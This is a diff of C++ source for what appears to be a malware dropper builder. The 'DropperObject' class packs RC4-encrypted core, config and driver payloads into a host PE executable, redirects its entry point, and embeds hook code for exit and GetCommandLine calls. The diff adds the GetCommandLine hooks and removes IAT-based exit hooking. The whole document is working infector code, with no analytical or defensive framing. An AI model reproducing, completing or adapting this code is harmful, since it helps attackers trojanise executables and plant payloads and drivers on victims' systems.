@@ -36,6 +36,8 @@ DropperObject::DropperObject(PEObject& pe)
 		_strings.push_back(std::string(_needed_strings[i]));
 		i++;
 	}
+
+	_exeType = _pe.exeType;
 }
 
 DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
@@ -58,6 +60,8 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	memset(header, 0, sizeof(DataSectionHeader));
 	ptr += sizeof(DataSectionHeader);
 	
+	header->exeType = _pe.exeType;
+
 	// Generate ecryption key
 	string rc4_key;
 	generate_key(rc4_key, sizeof(header->rc4key));
@@ -68,12 +72,6 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	
 	// Original EP
 	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
-	
-	// Indexes of calls to be hooked
-	header->hookedCalls.ExitProcess = _hookedCalls["ExitProcess"];
-	header->hookedCalls.TerminateProcess = _hookedCalls["TerminateProcess"];
-	header->hookedCalls.exit = _hookedCalls["exit"];
-	header->hookedCalls._exit = _hookedCalls["_exit"];
 	
 	// Strings offsets
 	header->stringsOffsets.offset = ptr - _data.get();
@@ -148,8 +146,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	// compute total data section size and store in buffer
 	dataBufferSize = ptr - _data.get();
 	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
-	ptr += sizeof(dataBufferSize);
-	
+	ptr += sizeof(dataBufferSize);	
 	END_MARKER(ptr);
 	
 	// find new EP and copy dropper code in it
@@ -188,10 +185,30 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	ptr += sizeof(DWORD);
 	END_MARKER(ptr);	
 	
+	
 	// ExitHook code
 	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
 	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
 	
+
+	cout << "GetCommandLineAHook: " << std::hex << GetCommandLineAHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
+	// GetCommandLineAHook data
+	*((DWORD*) ptr) = ptr - _data.get();
+	ptr += sizeof(DWORD);
+	END_MARKER(ptr);	
+
+	// GetCommandLineAHook code
+	ptr += _embedFunction((PVOID)GetCommandLineAHook, (PVOID)GetCommandLineAHook_End, header->functions.GetCommandLineAHook, ptr);
+
+	// GetCommandLineWHook data
+	*((DWORD*) ptr) = ptr - _data.get();
+	ptr += sizeof(DWORD);
+	END_MARKER(ptr);	
+	
+	// GetCommandLineWHook code
+	ptr += _embedFunction((PVOID)GetCommandLineWHook, (PVOID)GetCommandLineWHook_End, header->functions.GetCommandLineWHook, ptr);
+
+
 	// RC4 code
 	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
@@ -261,6 +278,7 @@ bool DropperObject::_addCodecFile( std::string path, std::string name )
 int DropperObject::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr )
 {
 	DWORD size = (DWORD)funcEnd - (DWORD)funcStart;
+
 	memcpy(ptr, (PBYTE) funcStart, size);
 	func.offset = ptr - _data.get();
 	func.size = size;
@@ -377,21 +395,6 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 		if (!driver64.empty())
 			_addDriver64File(driver64.string(), driver64.filename());
 		
-		_hookedCalls["ExitProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("ExitProcess"));	
-		_hookedCalls["TerminateProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("TerminateProcess"));
-		_hookedCalls["exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("exit"));
-		_hookedCalls["_exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("_exit"));
-		_hookedCalls["exit6"] = _getIATCallIndex(std::string("msvcr60.dll"), std::string("exit"));
-		_hookedCalls["exit7"] = _getIATCallIndex(std::string("msvcr70.dll"), std::string("exit"));
-		_hookedCalls["exit8"] = _getIATCallIndex(std::string("msvcr80.dll"), std::string("exit"));
-		_hookedCalls["exit9"] = _getIATCallIndex(std::string("msvcr90.dll"), std::string("exit"));
-		_hookedCalls["exit10"] = _getIATCallIndex(std::string("msvcr100.dll"), std::string("exit"));		
-		_hookedCalls["_exit6"] = _getIATCallIndex(std::string("msvcr60.dll"), std::string("_exit"));
-		_hookedCalls["_exit7"] = _getIATCallIndex(std::string("msvcr70.dll"), std::string("_exit"));
-		_hookedCalls["_exit8"] = _getIATCallIndex(std::string("msvcr80.dll"), std::string("_exit"));
-		_hookedCalls["_exit9"] = _getIATCallIndex(std::string("msvcr90.dll"), std::string("_exit"));
-		_hookedCalls["_exit10"] = _getIATCallIndex(std::string("msvcr100.dll"), std::string("_exit"));
-		
 		_build( (WINSTARTFUNC) _pe.epVA() );
 		
 	} catch (...) {
@@ -402,6 +405,7 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 	return true;
 }
 
+/*
 int DropperObject::_getIATCallIndex( std::string dll, std::string call )
 {
 	int index = -1;
@@ -415,6 +419,7 @@ int DropperObject::_getIATCallIndex( std::string dll, std::string call )
 	
 	return index;
 }
+*/
 
 void DropperObject::setPatchCode( std::size_t idx, DWORD VA, char const * const data, std::size_t size )
 {
